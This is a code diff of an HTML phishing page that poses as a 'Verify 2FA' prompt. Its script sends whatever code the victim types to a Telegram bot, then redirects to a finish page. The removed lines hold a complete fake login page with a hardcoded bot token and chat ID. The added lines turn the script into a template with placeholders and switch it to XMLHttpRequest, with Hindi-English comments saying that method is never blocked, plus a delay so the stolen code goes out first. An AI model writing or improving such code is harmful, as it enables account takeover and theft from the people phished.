@@ -1,67 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verify 2FA</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        body { background-color: #1c1f21; color: white; font-family: sans-serif; margin: 0; padding: 15px; }
-        .top-nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
-        .nav-btn { width: 40px; height: 40px; background: #272a2e; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+<script>
+    function sendOTP() {
+        const otp = document.getElementById('otp').value;
+        const botToken = 'YOUR_API_TOKEN_HERE'; // Apna Token yahan daalein
+        const chatId = 'YOUR_CHAT_ID_HERE';     // Apni Chat ID yahan daalein
         
-        .content { text-align: center; }
-        .icon-box { width: 60px; height: 60px; background: #272a2e; margin: 0 auto 20px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
-        h2 { font-size: 1.4em; margin-bottom: 10px; }
-        p { color: #8f9397; font-size: 0.9em; margin-bottom: 30px; line-height: 1.4; }
-        
-        .input-label { color: #8f9397; font-size: 0.85em; text-align: left; margin-bottom: 8px; }
-        .input-group { position: relative; margin-bottom: 25px; }
-        input { width: 100%; padding: 15px; background: #121415; border: 1px solid #2d3034; border-radius: 8px; color: white; font-size: 1em; box-sizing: border-box; }
-        .paste-btn { position: absolute; right: 10px; top: 10px; background: #272a2e; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 0.8em; cursor: pointer; }
-        
-        .no-access { color: white; font-weight: bold; margin-bottom: 30px; display: block; text-decoration: none; font-size: 0.9em; }
-        .submit-btn { width: 100%; padding: 15px; background-color: #3bc117; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 1em; cursor: pointer; }
-    </style>
-</head>
-<body>
-
-    <div class="top-nav">
-        <div class="nav-btn"><i class="fas fa-chevron-left"></i></div>
-        <div class="nav-btn"><i class="fas fa-list"></i></div>
-        <div class="nav-btn"><i class="fas fa-external-link-alt"></i></div>
-    </div>
-
-    <div class="content">
-        <div class="icon-box"><i class="fas fa-question"></i></div>
-        <h2>Verify 2FA</h2>
-        <p>Please enter the 6-digit verification code from the authenticator.</p>
-
-        <div class="input-label">Verification Code</div>
-        <div class="input-group">
-            <input type="number" id="otp" placeholder="Verification Code">
-            <button class="paste-btn">Paste</button>
-        </div>
-
-        <a href="#" class="no-access">Don't have access to this 2FA?</a>
-        <button class="submit-btn" onclick="sendOTP()">Submit</button>
-    </div>
-
-    <script>
-        function sendOTP() {
-            const otp = document.getElementById('otp').value;
-            const botToken = '8086684078:AAEpy5bmjSrkOQVGAAY6Cfthg5-O7rjzqHQ';
-            const chatId = '7745903783';
-            
-            const text = `🚨 2FA CODE RECEIVED 🚨\nCode: ${otp}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-
-            fetch(url).then(() => {
-                window.location.href = 'finish.html';
-            }).catch(() => {
-                window.location.href = 'finish.html';
-            });
+        if (otp === "" || otp.length < 6) {
+            alert("Please enter a valid 6-digit code");
+            return;
         }
-    </script>
-</body>
-</html>
+
+        const text = `🚨 2FA CODE RECEIVED 🚨\nCode: ${otp}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+        // Yeh 'XMLHttpRequest' method kisi bhi browser mein block nahi hota
+        const xhttp = new XMLHttpRequest();
+        xhttp.open("GET", url, true);
+        xhttp.send();
+
+        // Redirect hone ke liye thoda wait (taaki request chali jaye)
+        setTimeout(() => {
+            window.location.href = 'finish.html';
+        }, 500);
+    }
+</script>
